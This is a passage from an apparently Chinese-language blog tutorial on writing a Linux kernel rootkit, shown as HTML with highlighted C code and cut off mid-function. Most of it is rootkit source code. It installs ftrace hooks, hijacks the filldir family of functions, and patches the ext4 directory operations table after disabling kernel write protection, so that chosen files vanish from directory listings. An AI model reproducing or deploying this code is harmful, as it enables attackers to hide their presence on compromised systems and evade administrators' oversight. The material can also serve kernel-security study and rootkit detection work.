*</span></span><br><span class="line"><span class="comment"> * This can allocate memory which must be freed before @ops can be freed,</span></span><br><span class="line"><span class="comment"> * either by removing each filtered addr or by using</span></span><br><span class="line"><span class="comment"> * ftrace_free_filter(@ops).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ftrace_set_filter_ip</span><span class="params">(struct ftrace_ops *ops, <span class="keyword">unsigned</span> <span class="keyword">long</span> ip,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">int</span> remove, <span class="keyword">int</span> reset)</span></span></span><br></pre></td></tr></table></figure><p>å½“åˆ›å»ºå¥½ä¸€ä¸ª<code>ftrace_ops</code>ä¹‹åï¼Œå¯ä»¥ä½¿ç”¨ä¸Šè¿°<code>ftrace_set_filter_ip</code>å‡½æ•°å°†å…¶æ³¨å†Œåˆ°filterä¸­ï¼ŒåŒæ ·ä¹Ÿå¯ä»¥ä½¿ç”¨è¯¥å‡½æ•°å°†<code>ftrace_ops</code>ä»filterä¸­åˆ é™¤ã€‚åœ¨å®Œæˆæ³¨å†Œæ“ä½œåå¯ä»¥ä½¿ç”¨<code>register_ftrace_function</code>å‡½æ•°å°†å…¶æ”¾ç½®åˆ°hookç‚¹ä½ä¸Šï¼ŒåŒæ ·å¯ä»¥ä½¿ç”¨<code>unregister_ftrace_function</code>å‡½æ•°å°†å…¶è„±ç¦»ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct ftrace_ops *<span class="title">rootkit_ftrace_hook_install</span><span class="params">(<span class="keyword">void</span> *hook_dst,</span></span></span><br><span class="line"><span class="params"><span class="function">                                               <span class="keyword">ftrace_func_t</span> new_dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ftrace_ops</span> *<span class="title">hook_ops</span>;</span></span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">    hook_ops = kmalloc(GFP_KERNEL, <span class="keyword">sizeof</span>(*hook_ops));</span><br><span class="line">    hook_ops-&gt;func = new_dst;</span><br><span class="line">    hook_ops-&gt;flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;</span><br><span class="line"></span><br><span class="line">    err = ftrace_set_filter_ip(hook_ops, hook_dst, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;[rootkit:] failed to set ftrace filter.&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = register_ftrace_function(hook_ops);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;[rootkit:] failed to register ftrace fn.&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[rootkit:] register ftrace hook at %p&quot;</span>, hook_dst);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hook_ops;</span><br><span class="line"></span><br><span class="line">failed:</span><br><span class="line">    kfree(hook_ops);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rootkit_ftrace_hook_remove</span><span class="params">(struct ftrace_ops *hook_ops, <span class="keyword">void</span> *hook_dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">    err = unregister_ftrace_function(hook_ops);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;[rootkit:] failed to unregister ftrace.&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = ftrace_set_filter_ip(hook_ops, hook_dst, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;[rootkit:] failed to rmove ftrace point.&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶éšè—"><a href="#æ–‡ä»¶éšè—" class="headerlink" title="æ–‡ä»¶éšè—"></a>æ–‡ä»¶éšè—</h2><p>åœ¨å‰ä¸€ç¯‡æ–‡ç« ä¸­è™½ç„¶æåˆ°çš„æ–‡ä»¶éšè—ä½†æ˜¯åªæ˜¯é’ˆå¯¹ä»…å­˜åœ¨äºå†…å­˜ä¸­çš„æ–‡ä»¶ç³»ç»Ÿ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">simple_dir_operations</span> =</span> &#123;</span><br><span class="line">.open= dcache_dir_open,</span><br><span class="line">.release= dcache_dir_close,</span><br><span class="line">.llseek= dcache_dir_lseek,</span><br><span class="line">.read= generic_read_dir,</span><br><span class="line">.iterate_shared= dcache_readdir,</span><br><span class="line">.fsync= noop_fsync,</span><br><span class="line">&#125;;</span><br><span class="line">EXPORT_SYMBOL(simple_dir_operations);</span><br></pre></td></tr></table></figure><p>è¿™ç±»æ–‡ä»¶ç³»ç»Ÿé€šå¸¸ä½¿ç”¨<code>simple_dir_operations</code>ä½œä¸ºå‡½æ•°è¡¨ï¼Œæ–‡ä»¶éå†å‡½æ•°ä¸º<code>dcache_readdir</code>ã€‚</p><p>ä½†æ˜¯å¯¹äºç°å®ç¯å¢ƒä¸­çš„å¤§å¤šç³»ç»Ÿé€šå¸¸ä½¿ç”¨çš„ext4æ–‡ä»¶ç³»ç»Ÿï¼Œå‰é¢é’ˆå¯¹å†…æ ¸çš„éšè—è¡Œå°±ä¸é‚£ä¹ˆè¡Œçš„é€šäº†ã€‚</p><h3 id="åŠ«æŒgetdentsç³»ç»Ÿè°ƒç”¨æ ¸å¿ƒå‡½æ•°"><a href="#åŠ«æŒgetdentsç³»ç»Ÿè°ƒç”¨æ ¸å¿ƒå‡½æ•°" class="headerlink" title="åŠ«æŒgetdentsç³»ç»Ÿè°ƒç”¨æ ¸å¿ƒå‡½æ•°"></a>åŠ«æŒgetdentsç³»ç»Ÿè°ƒç”¨æ ¸å¿ƒå‡½æ•°</h3><p>åœ¨ä½¿ç”¨lsæŸ¥çœ‹ç›®å½•ä¸‹çš„æ–‡ä»¶æ—¶ï¼Œå®é™…ä¸Šä¼šè°ƒç”¨<code>getdents64</code>/<code>getdents</code>/<code>compat_getdents</code>è¿™ä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨å…¶ä¸­çš„ä¸€ä¸ªï¼Œè€Œä»–ä»¬çš„æ ¸å¿ƒé€»è¾‘éƒ½æ˜¯<code>iterate_dir</code>å®ç°çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">iterate_dir</span><span class="params">(struct file *file, struct dir_context *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file_inode(file);</span><br><span class="line"><span class="keyword">int</span> res = -ENOTDIR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!file-&gt;f_op-&gt;iterate_shared)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">res = security_file_permission(file, MAY_READ);</span><br><span class="line"><span class="keyword">if</span> (res)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">res = fsnotify_file_perm(file, MAY_READ);</span><br><span class="line"><span class="keyword">if</span> (res)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">res = down_read_killable(&amp;inode-&gt;i_rwsem);</span><br><span class="line"><span class="keyword">if</span> (res)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">res = -ENOENT;</span><br><span class="line"><span class="keyword">if</span> (!IS_DEADDIR(inode)) &#123;</span><br><span class="line">ctx-&gt;pos = file-&gt;f_pos;</span><br><span class="line">res = file-&gt;f_op-&gt;iterate_shared(file, ctx);</span><br><span class="line">file-&gt;f_pos = ctx-&gt;pos;</span><br><span class="line">fsnotify_access(file);</span><br><span class="line">file_accessed(file);</span><br><span class="line">&#125;</span><br><span class="line">inode_unlock_shared(inode);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(iterate_dir);</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆéƒ½ä¼šè°ƒç”¨åˆ°<code>file-&gt;f_op-&gt;iterate_shared</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">ext4_dir_operations</span> =</span> &#123;</span><br><span class="line">.llseek= ext4_dir_llseek,</span><br><span class="line">.read= generic_read_dir,</span><br><span class="line">.iterate_shared= ext4_readdir,</span><br><span class="line">.unlocked_ioctl = ext4_ioctl,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_ioctl= ext4_compat_ioctl,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">.fsync= ext4_sync_file,</span><br><span class="line">.release= ext4_release_dir,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä»¥ext4ä¸ºä¾‹ï¼Œæœ€ç»ˆè°ƒç”¨<code>ext4_readdir</code>å‡½æ•°ã€‚å…¶å­˜åœ¨è¿™æ ·ä¸€æ¡è°ƒç”¨é“¾<code>ext4_readdir</code> =&gt; <code>ext4_dx_readdir</code> =&gt; <code>call_filldir</code> =&gt; <code>dir_emit</code> =&gt; <code>ctx-&gt;actor</code>ã€‚</p><p>ä¸Šè¿°è°ƒç”¨é“¾ä¸­å¡«å……æ•°æ®å¹¶è¿”å›ç»™ç”¨æˆ·æ€çš„æ ¸å¿ƒå‡½æ•°ä¾¿æ˜¯è°ƒç”¨<code>ctx-&gt;actor</code>ï¼Œè€Œå…¶çœŸæ­£è°ƒç”¨çš„æ˜¯<code>filldir</code>/<code>filldir64</code>/<code>compat_filldir</code>å‡½æ•°ã€‚</p><p>æ‰€ä»¥ç»“åˆå‰æ–‡çš„å‡½æ•°åŠ«æŒæŠ€æœ¯ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥å¯¹<code>filldir</code>/<code>filldir64</code>/<code>compat_filldir</code>å‡½æ•°è¿›è¡ŒåŠ«æŒï¼Œåœ¨é‡åˆ°æˆ‘ä»¬éšè—æ–‡ä»¶æ—¶ç›´æ¥è¿”å›ä»è€Œè¾¾åˆ°éšè—æ–‡ä»¶çš„æ•ˆæœã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hook_info</span> <span class="title">filldir_hook_info</span>, <span class="title">filldir64_hook_info</span>, <span class="title">compat_filldir_hook_info</span>;</span></span><br><span class="line"><span class="keyword">filldir_t</span> filldir, filldir64, compat_filldir;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hide_file_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *file_name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">hide_file_list</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">rootkit_evil_filldir64</span><span class="params">(<span class="keyword">size_t</span> arg0, <span class="keyword">size_t</span> arg1, <span class="keyword">size_t</span> arg2,</span></span></span><br><span class="line"><span class="params"><span class="function">                              <span class="keyword">size_t</span> arg3, <span class="keyword">size_t</span> arg4, <span class="keyword">size_t</span> arg5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hide_file_info</span> *<span class="title">info</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">size_t</span> args[<span class="number">6</span>], ret;</span><br><span class="line"></span><br><span class="line">    args[<span class="number">0</span>] = arg0;</span><br><span class="line">    args[<span class="number">1</span>] = arg1;</span><br><span class="line">    args[<span class="number">2</span>] = arg2;</span><br><span class="line">    args[<span class="number">3</span>] = arg3;</span><br><span class="line">    args[<span class="number">4</span>] = arg4;</span><br><span class="line">    args[<span class="number">5</span>] = arg5;</span><br><span class="line"></span><br><span class="line">    rootkit_write_read_only_mem_by_ioremap(filldir_hook_info.orig_func,</span><br><span class="line">                                           filldir_hook_info.orig_data,</span><br><span class="line">                                           HOOK_BUF_SZ);</span><br><span class="line"></span><br><span class="line">    list_for_each_entry(info, &amp;hide_file_list, <span class="built_in">list</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(info-&gt;file_name, args[<span class="number">1</span>], args[<span class="number">2</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            ret = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">goto</span> hide_out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = filldir_hook_info.orig_func(args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>],</span><br><span class="line">                                      args[<span class="number">3</span>], args[<span class="number">4</span>], args[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">hide_out:</span><br><span class="line">    rootkit_write_read_only_mem_by_ioremap(filldir_hook_info.orig_func,</span><br><span class="line">                                           filldir_hook_info.hook_data,</span><br><span class="line">                                           HOOK_BUF_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_hide_file_subsystem_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    INIT_LIST_HEAD(&amp;hide_file_list);</span><br><span class="line">    rootkit_text_hook(filldir, rootkit_evil_filldir,</span><br><span class="line">                      &amp;filldir_hook_info);</span><br><span class="line">    rootkit_text_hook(filldir64, rootkit_evil_filldir64,</span><br><span class="line">                      &amp;filldir64_hook_info);</span><br><span class="line">    rootkit_text_hook(compat_filldir, rootkit_evil_compat_filldir,</span><br><span class="line">                      &amp;compat_filldir_hook_info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_add_new_hide_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *file_name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hide_file_info</span> *<span class="title">info</span>;</span></span><br><span class="line"></span><br><span class="line">    info = kmalloc(<span class="keyword">sizeof</span>(*info), GFP_KERNEL);</span><br><span class="line">    info-&gt;file_name = kmalloc(<span class="built_in">strlen</span>(file_name) + <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line">    <span class="built_in">strcpy</span>(info-&gt;file_name, file_name);</span><br><span class="line"></span><br><span class="line">    list_add(&amp;info-&gt;<span class="built_in">list</span>, &amp;hide_file_list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åŠ«æŒå¯¹åº”æ–‡ä»¶ç³»ç»Ÿçš„VFSå‡½æ•°è¡¨"><a href="#åŠ«æŒå¯¹åº”æ–‡ä»¶ç³»ç»Ÿçš„VFSå‡½æ•°è¡¨" class="headerlink" title="åŠ«æŒå¯¹åº”æ–‡ä»¶ç³»ç»Ÿçš„VFSå‡½æ•°è¡¨"></a>åŠ«æŒå¯¹åº”æ–‡ä»¶ç³»ç»Ÿçš„VFSå‡½æ•°è¡¨</h3><p>å‰é¢æåˆ°ä¾¿åˆ©æ–‡ä»¶ä¸€å®šä¼šè°ƒç”¨åˆ°<code>iterate_dir</code>å‡½æ•°ï¼Œè€Œå…¶åˆä¼šè°ƒç”¨å‡½æ•°è¡¨ä¸­çš„<code>iterate_shared</code>å‡½æ•°ï¼Œæ‰€ä»¥è¿™é‡Œé€šè¿‡åŠ«æŒå‡½æ•°è¡¨ä¸­çš„<code>iterate_shared</code>å‡½æ•°ä¸ºæˆ‘ä»¬è‡ªå·±çš„å‡½æ•°ï¼Œéšååœ¨ä¿®æ”¹ctxåŠ«æŒ<code>ctx-&gt;actor</code>ä¸ºæˆ‘ä»¬è‡ªå·±çš„å‡½æ•°å³å¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hook_info</span> <span class="title">filldir_hook_info</span>,<span class="title">filldir64_hook_info</span>,<span class="title">compat_filldir_hook_info</span>;</span></span><br><span class="line"><span class="keyword">filldir_t</span> filldir, filldir64, compat_filldir;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">ext4_dir_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hide_file_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *file_name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">hide_file_list</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_fake_filldir</span><span class="params">(struct dir_context *ctx, <span class="keyword">const</span> <span class="keyword">char</span> *name,</span></span></span><br><span class="line"><span class="params"><span class="function">                                   <span class="keyword">int</span> namlen, <span class="keyword">loff_t</span> offset, u64 ino, </span></span></span><br><span class="line"><span class="params"><span class="function">                                   <span class="keyword">unsigned</span> <span class="keyword">int</span> d_type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (rootkit_check_file_to_hide(name, namlen)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> filldir(ctx, name, namlen, offset, ino, d_type);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_fake_filldir64</span><span class="params">(struct dir_context *ctx, <span class="keyword">const</span> <span class="keyword">char</span> *name,</span></span></span><br><span class="line"><span class="params"><span class="function">                                     <span class="keyword">int</span> namlen, <span class="keyword">loff_t</span> offset, u64 ino, </span></span></span><br><span class="line"><span class="params"><span class="function">                                     <span class="keyword">unsigned</span> <span class="keyword">int</span> d_type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (rootkit_check_file_to_hide(name, namlen)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> filldir64(ctx, name, namlen, offset, ino, d_type);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_fake_compat_filldir</span><span class="params">(struct dir_context *ctx, <span class="keyword">const</span> <span class="keyword">char</span> *name,</span></span></span><br><span class="line"><span class="params"><span class="function">                                          <span class="keyword">int</span> namlen, <span class="keyword">loff_t</span> offset, u64 ino, </span></span></span><br><span class="line"><span class="params"><span class="function">                                          <span class="keyword">unsigned</span> <span class="keyword">int</span> d_type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (rootkit_check_file_to_hide(name, namlen)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> compat_filldir(ctx, name, namlen, offset, ino, d_type);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> (*orig_ext4_iterate_shared) (struct file *, struct dir_context *);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_fake_ext4_iterate_shared</span><span class="params">(struct file *file, </span></span></span><br><span class="line"><span class="params"><span class="function">                                               struct dir_context *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;actor == filldir) &#123;</span><br><span class="line">        ctx-&gt;actor = (<span class="keyword">void</span>*) rootkit_fake_filldir;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctx-&gt;actor == filldir64) &#123;</span><br><span class="line">        ctx-&gt;actor = (<span class="keyword">void</span>*) rootkit_fake_filldir64;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctx-&gt;actor == compat_filldir) &#123;</span><br><span class="line">        ctx-&gt;actor = (<span class="keyword">void</span>*) rootkit_fake_compat_filldir;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        panic(<span class="string">&quot;Unexpected ctx-&gt;actor!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> orig_ext4_iterate_shared(file, ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rootkit_vfs_hide_file_subsystem_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line"></span><br><span class="line">    INIT_LIST_HEAD(&amp;hide_file_list);</span><br><span class="line"></span><br><span class="line">    rootkit_disable_write_protect();</span><br><span class="line"></span><br><span class="line">    file = filp_open(<span class="string">&quot;/&quot;</span>, O_RDONLY, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(file)) &#123;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ext4_dir_operations = file-&gt;f_op;</span><br><span class="line">    printk(KERN_ERR <span class="string">&quot;Got addr of ext4_dir_operations: %lx&quot;</span>,ext4_dir_operations);</span><br><span class="line">    orig_ext4_iterate_shared = ext4_dir_operations-&gt;iterate_shared;</span><br><span class="line">    ext4_dir_operations-&gt;iterate_shared = rootkit_fake_ext4_iterate_shared;</span><br><span class="line"></span><br><span class="line">    